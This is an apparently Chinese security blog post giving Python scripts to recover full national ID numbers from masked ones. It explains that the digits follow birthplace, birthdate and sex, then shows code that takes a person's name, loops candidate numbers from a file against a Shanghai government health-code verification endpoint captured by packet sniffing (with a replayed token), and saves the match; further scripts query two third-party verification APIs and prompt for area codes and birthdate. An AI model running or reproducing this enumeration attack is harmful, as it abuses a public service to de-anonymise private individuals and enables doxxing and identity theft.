---
title: 身份证二要素验证
date: 2022-08-17 17:03:17
categories: "技术"
tags: "网安"
---
# SfzVertify
## 身份证二要素验证

​	身份证号是的编排是有**一定规律可循**的。除了最后1位是校验位外，其余各位与**出生地**、**出生日期**、**性别**、**出生编号**息息相关，因此即使是**经脱敏处理**的身份证号，仍能通过程序分析的方式过滤出可能的**身份证序列组合**。所以我们可以通过**出生地**、**出生日期**、**性别**、**出生编号**这些信息进行身份证的猜解，从而实现身份证号码bp.

### 这个API是上海随申办身份证二要素抓包抓出来的

```python
def check():
    url = "https://suishenmafront1.sh.gov.cn/smzy/yqfkewm/relative/idcard-auth"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; M2012K11AC Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4343 MMWEBSDK/20221011 Mobile Safari/537.36 MMWEBID/4555 MicroMessenger/8.0.30.2260(0x28001E3B) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 miniProgram/wxc5059c3803665d9c",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
        "X-Requested-With": "com.tencent.mm"
    }
    pron_name=input("请输入要验证的名字：")
    print("进行二要素验证，请耐心等待..........")
    f = open("sfz.txt", "r")
    lines = f.readlines()
    for line in lines:
        line = line.strip()
        data = {
            "name": f"{pron_name}",
            "id_card": line,
            "mw": "tChGO5otqa6EEnpLpO5bfyXgLMtLQFynXhpsSS3ZDPWi29wZbe0TuOhDMUwl3QSP6YEJKJShiBUn820KajqFDahFOCyQnr 3YRqdWy 2Pw9PzvCa GP2nm7KWFSzrrlFr/LzA2sPTCPPoRK/UvENLQ=="
        }

        try:
            r = requests.post(url, headers=headers, json=data).json()
            if (r['code'] == 200):
                fok = open("successful.txt", 'a+')
                fok.write(line)
                fok.close
            print(line + "|" + str(r['code']))
        except Exception as e:
            fe = open("fail.txt", 'a+')
            fe.write(line)
            fe.close

```

### 其他API

```python
import os, sys, requests


def suishenma(name, idcard):
    url = "https://suishenmafront1.sh.gov.cn/smzy/yqfkewm/relative/idcard-auth"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; M2012K11AC Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4343 MMWEBSDK/20221011 Mobile Safari/537.36 MMWEBID/4555 MicroMessenger/8.0.30.2260(0x28001E3B) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 miniProgram/wxc5059c3803665d9c",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
        "X-Requested-With": "com.tencent.mm"
    }

    data = {
        "name": name,
        "id_card": str(idcard),
        "mw": "tChGO5otqa6EEnpLpO5bfyXgLMtLQFynXhpsSS3ZDPWi29wZbe0TuOhDMUwl3QSP6YEJKJShiBUn820KajqFDahFOCyQnr 3YRqdWy 2Pw9PzvCa GP2nm7KWFSzrrlFr/LzA2sPTCPPoRK/UvENLQ=="
    }

    try:
        r = requests.post(url, headers=headers, json=data)

        rescode = r.json()["code"]
        if (rescode == 200):
            status = "校验正确"
        else:
            status = r.json()["message"]
        print("上海随申码: " + status)
    except Exception as e:
        pass


def guyunge(name, idcard):
    url = "https://api.guyunge.top/API/er.php"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
    }

    data = {
        "name": name,
        "card": str(idcard),
        "type": "json"
    }

    try:
        r = requests.post(url, headers=headers, data=data)

        rescode = r.json()["code"]
        if (rescode == 1):
            status = "校验正确"
        else:
            status = r.json()["text"]
        print("孤云阁API: " + status)
    except Exception as e:
        pass


def tingfengke(name, idcard):
    url = "http://tc.tfkapi.top/API/eysjy.php"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
    }

    data = {
        "name": name,
        "num": str(idcard),
    }

    try:
        r = requests.get(url, headers=headers, params=data).text

        if (r == "校验成功-TFK"):
            status = "校验正确"
        else:
            status = r
        print("听风客API: " + status)
    except Exception as e:
        pass


if __name__ == "__main__":
    suishenma(sys.argv[1], sys.argv[2])
    guyunge(sys.argv[1], sys.argv[2])
    tingfengke(sys.argv[1], sys.argv[2])
```

### 代码进行提示

```python
print("请输入区号开始【例：230101哈尔滨市辖区】：")
    a_1 = int(input())
    print("请输入区号结束【例：区号结束+1 230129+1延寿县】：")
    a_2 = int(input())  # 区号结束+1 230129+1延寿县
    print("请输入出生年月日:【19820606】")
    s = input() + "****"  # 举例：身份证号缺后四位
```

![???](images/bg1.jpg)
